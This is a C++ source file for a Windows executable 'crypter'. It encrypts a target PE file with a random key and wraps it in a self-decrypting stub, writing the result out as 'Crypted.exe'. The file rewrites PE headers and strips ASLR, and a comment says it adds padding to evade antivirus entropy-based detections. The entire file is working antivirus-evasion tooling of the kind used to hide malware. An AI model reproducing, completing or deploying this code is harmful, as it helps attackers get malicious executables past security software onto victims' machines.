#include <Windows.h>
#include <stdio.h>

#include "stub.h"

DWORD dwStubCodeBase = 0;
DWORD dwStubCodeSize = 0;
DWORD dwStubDataBase = 0;
DWORD dwStubDataSize = 0;

BYTE* ReadFileToMem( WCHAR* szFileName, DWORD& dwSize )
{
	HANDLE hFile = CreateFile( szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL );

	if ( hFile == INVALID_HANDLE_VALUE )
		return 0;

	dwSize = GetFileSize( hFile, NULL );

	if ( !dwSize )
		return 0;

	BYTE* pFileBuffer = (BYTE*)VirtualAlloc( NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	if ( !pFileBuffer )
		return 0;

	DWORD dwRead = 0;
	ReadFile( hFile, pFileBuffer, dwSize, &dwRead, NULL );
	CloseHandle( hFile );

	return pFileBuffer;
}

void GenerateKey()
{
	for ( int i = 0; i < sizeof( bKey ); i++ )
	{
		bKey[i] = (BYTE)rand();
	}
}

void FixAddress( BYTE* pBase, DWORD dwSize, DWORD dwOldBase, DWORD dwNewBase )
{
	for ( int i = (int)pBase; i < (int)( pBase + dwSize ); i++ )
	{
		if ( *(DWORD*)i >= dwOldBase && *(DWORD*)i < ( dwOldBase + dwSize ) )
		{
			*(DWORD*)i -= dwOldBase;
			*(DWORD*)i += dwNewBase;
		}
	}
}

bool GetStubSectionInfo( DWORD_PTR dwCrypterBase )
{
	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)dwCrypterBase;
	if ( pIDH->e_magic != IMAGE_DOS_SIGNATURE )
		return false;

	IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)( dwCrypterBase + pIDH->e_lfanew );
	if ( pINH->Signature != IMAGE_NT_SIGNATURE )
		return false;

	IMAGE_SECTION_HEADER* pISH = IMAGE_FIRST_SECTION( pINH );

	for ( int i = 0; i < pINH->FileHeader.NumberOfSections; i++ )
	{
		if ( !memcmp( (char*)pISH[i].Name, ".stubc", 8 ) )
		{
			dwStubCodeBase = dwCrypterBase + pISH[i].VirtualAddress;
			dwStubCodeSize = pISH[i].Misc.VirtualSize;
		}

		if ( !memcmp( (char*)pISH[i].Name, ".stubd", 8 ) )
		{
			dwStubDataBase = dwCrypterBase + pISH[i].VirtualAddress;
			dwStubDataSize = pISH[i].Misc.VirtualSize;
		}
	}

	if ( dwStubCodeBase && dwStubCodeSize && dwStubDataBase && dwStubDataSize )
		return true;
	else
		return false;
}

int CalculateIncreasedSize( int dwIn, int inc_every, int inc_multi )
{
	int iRet = 0;

	for ( int i = 0; i < dwIn; i++ )
	{
		iRet++;

		if ( i % inc_every == 0 )
			iRet += inc_multi;	
	}

	return iRet;
}

int InFile( BYTE* bIn, BYTE* bOut, DWORD dwSize, int inc_every, int inc_multi )
{
	int increased = 0;

	for ( int i = 0; i < dwSize; i++ )
	{
		*( bOut + increased ) = *( bIn + i );
		increased++;

		if ( i % inc_every == 0 )
			increased += inc_multi;
	}

	return increased;
}

bool CryptFile( WCHAR* szFilePath )
{
	bool bReturn = false;

	HANDLE hFile = CreateFile( L"Crypted.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
		return false;

	DWORD dwSize = 0;
	BYTE* pFileBuffer = ReadFileToMem( szFilePath, dwSize );
	dwFileSize = dwSize;

	if ( !pFileBuffer )
	{
		CloseHandle( hFile );
		return false;
	}

	IMAGE_DOS_HEADER stubIDH = { 0 };
	IMAGE_NT_HEADERS stubINH = { 0 };
	IMAGE_SECTION_HEADER stubISH[2] = { 0 };
	DWORD_PTR dwCrypterBase = (DWORD_PTR)GetModuleHandle( NULL );
	DWORD dwBytesWritten = 0;

	//warning: using goto can cause dinosaur attacks, use at own risk
	//http://i.stack.imgur.com/6C1F5.png

	IMAGE_DOS_HEADER* pFileIDH = (IMAGE_DOS_HEADER*)pFileBuffer;
	if ( pFileIDH->e_magic != IMAGE_DOS_SIGNATURE )
	{
		wprintf( L"Not a PE File.\n" );
		goto clean_up;
	}

	IMAGE_NT_HEADERS* pFileINH = (IMAGE_NT_HEADERS*)( pFileBuffer + pFileIDH->e_lfanew );
	if ( pFileINH->Signature != IMAGE_NT_SIGNATURE )
	{
		wprintf( L"Not a PE File.\n" );
		goto clean_up;
	}

	if ( !GetStubSectionInfo( dwCrypterBase ) )
	{
		wprintf( L"Couldn't find stub code/data section.\n" );
		goto clean_up;
	}

	GenerateKey();
	SIMPLE_ENCRYPT( pFileBuffer, dwSize, bKey, sizeof( bKey ), true );
	SIMPLE_ENCRYPT( (BYTE*)( (DWORD)&dwEncryptStartMarker ), ( (DWORD)&dwEncryptEndMarker - (DWORD)&dwEncryptStartMarker ), bKey, sizeof( bKey ), false );

	stubIDH = *(IMAGE_DOS_HEADER*)dwCrypterBase;
	if ( stubIDH.e_magic != IMAGE_DOS_SIGNATURE ) //for good measure
		goto clean_up;

	stubINH = *(IMAGE_NT_HEADERS*)( dwCrypterBase + stubIDH.e_lfanew );
	if ( stubINH.Signature != IMAGE_NT_SIGNATURE ) //for good measure
		goto clean_up;

	memset( &stubIDH, 0, sizeof( IMAGE_DOS_HEADER ) );
	stubIDH.e_magic = IMAGE_DOS_SIGNATURE;
	stubIDH.e_lfanew = sizeof( IMAGE_DOS_HEADER );

	memset( stubINH.OptionalHeader.DataDirectory, 0, sizeof( IMAGE_DATA_DIRECTORY ) * IMAGE_NUMBEROF_DIRECTORY_ENTRIES );

	if ( stubINH.OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE )
	{
		wprintf( L"\n************************************************\n" );
		wprintf( L"Crypter has been compiled with ASLR, if crypted file doesn't work please turn ASLR off and compile again!\n" );
		wprintf( L"************************************************\n" );

		stubINH.OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		stubINH.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;	
	}

	//these will determine how much padding to add to crypted file (in case of entropy based detections, multiple AVs use these kinds of detections)
	//every inc_every add inc_multi
	const int inc_every = 3;
	const int inc_multi = 0; //0 = no increased size, increase this to add more size in case of entropy based detections

	dwSplitMulti = inc_multi;
	dwSplitIncrease = inc_every;

	dwPaddedFileSize = CalculateIncreasedSize( dwFileSize, inc_every, inc_multi );

	DWORD dwStubCodeTotal = dwStubCodeSize;
	DWORD dwStubDataTotal = dwStubDataSize + dwPaddedFileSize;

	char* szCode = ".text";
	char* szData = ".data";

	memcpy( stubISH[0].Name, szCode, strlen( szCode ) );
	stubISH[0].PointerToRawData = stubINH.OptionalHeader.SizeOfHeaders;
	stubISH[0].SizeOfRawData = Align( dwStubCodeTotal, stubINH.OptionalHeader.FileAlignment );
	stubISH[0].VirtualAddress = stubINH.OptionalHeader.SectionAlignment;
	stubISH[0].Misc.VirtualSize = dwStubCodeTotal;
	stubISH[0].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;

	memcpy( stubISH[1].Name, szData, strlen( szData ) );
	stubISH[1].PointerToRawData = Align( stubISH[0].PointerToRawData + stubISH[0].SizeOfRawData, stubINH.OptionalHeader.FileAlignment );
	stubISH[1].SizeOfRawData = Align( dwStubDataTotal, stubINH.OptionalHeader.FileAlignment );
	stubISH[1].VirtualAddress = Align( stubISH[0].VirtualAddress + stubISH[0].Misc.VirtualSize, stubINH.OptionalHeader.SectionAlignment );
	stubISH[1].Misc.VirtualSize = dwStubDataTotal;
	stubISH[1].Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_INITIALIZED_DATA;

	stubINH.FileHeader.NumberOfSections = 2;
	stubINH.OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
	stubINH.OptionalHeader.SizeOfInitializedData = 0;
	stubINH.OptionalHeader.SizeOfCode = stubISH[0].SizeOfRawData;
	stubINH.OptionalHeader.BaseOfData = stubISH[1].VirtualAddress;
	stubINH.OptionalHeader.SizeOfImage = Align( stubISH[1].VirtualAddress + stubISH[1].Misc.VirtualSize, stubINH.OptionalHeader.SectionAlignment );
	stubINH.OptionalHeader.AddressOfEntryPoint = stubISH[0].VirtualAddress + ( (DWORD_PTR)stub_start - dwStubCodeBase );

	stubINH.OptionalHeader.DataDirectory[1].VirtualAddress = 0x41;

	WriteFile( hFile, &stubIDH, sizeof( IMAGE_DOS_HEADER ), &dwBytesWritten, 0 );
	SetFilePointer( hFile, 0, 0, FILE_END );
	WriteFile( hFile, &stubINH, sizeof( IMAGE_NT_HEADERS ), &dwBytesWritten, 0 );

	for ( int i = 0; i < stubINH.FileHeader.NumberOfSections; i++ )
	{
		SetFilePointer( hFile, sizeof( IMAGE_DOS_HEADER ) + sizeof( IMAGE_NT_HEADERS ) + ( sizeof( IMAGE_SECTION_HEADER ) * i ), 0, FILE_BEGIN );
		WriteFile( hFile, &stubISH[i], sizeof( IMAGE_SECTION_HEADER ), &dwBytesWritten, 0 );
	}

	DWORD dwPadding = stubINH.OptionalHeader.SizeOfHeaders - ( sizeof( IMAGE_DOS_HEADER ) + sizeof( IMAGE_NT_HEADERS ) + ( sizeof( IMAGE_SECTION_HEADER ) * stubINH.FileHeader.NumberOfSections ) );
	BYTE* pPadding = (BYTE*)VirtualAlloc( NULL, dwPadding, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	if ( !pPadding )
		goto clean_up;

	memset( pPadding, 0, dwPadding );
	SetFilePointer( hFile, 0, 0, FILE_END );
	WriteFile( hFile, pPadding, dwPadding, &dwBytesWritten, 0 );
	VirtualFree( pPadding, 0, MEM_RELEASE );

	BYTE* pStubCode = (BYTE*)VirtualAlloc( NULL, dwStubCodeTotal, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	if ( !pStubCode )
		goto clean_up;

	memset( pStubCode, 0, dwStubCodeTotal );
	memcpy( pStubCode, (void*)dwStubCodeBase, dwStubCodeSize );

	FixAddress( pStubCode, dwStubCodeSize, dwStubDataBase, stubINH.OptionalHeader.ImageBase + stubISH[1].VirtualAddress );

	SetFilePointer( hFile, 0, 0, FILE_END );
	WriteFile( hFile, pStubCode, stubISH[0].SizeOfRawData, &dwBytesWritten, 0 );
	VirtualFree( pStubCode, 0, MEM_RELEASE );

	BYTE* pStubData = (BYTE*)VirtualAlloc( NULL, stubISH[1].SizeOfRawData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	if ( !pStubData )
		goto clean_up;

	memset( pStubData, 0, stubISH[1].SizeOfRawData );
	memcpy( pStubData, (void*)dwStubDataBase, dwStubDataSize );

	InFile( pFileBuffer, (BYTE*)( pStubData + dwStubDataSize ), dwSize, inc_every, inc_multi );

	SetFilePointer( hFile, 0, 0, FILE_END );
	WriteFile( hFile, pStubData, stubISH[1].SizeOfRawData, &dwBytesWritten, 0 );

	VirtualFree( pStubData, 0, MEM_RELEASE );

	bReturn = true;
clean_up:
	CloseHandle( hFile );
	VirtualFree( pFileBuffer, 0, MEM_RELEASE );

	return bReturn;
}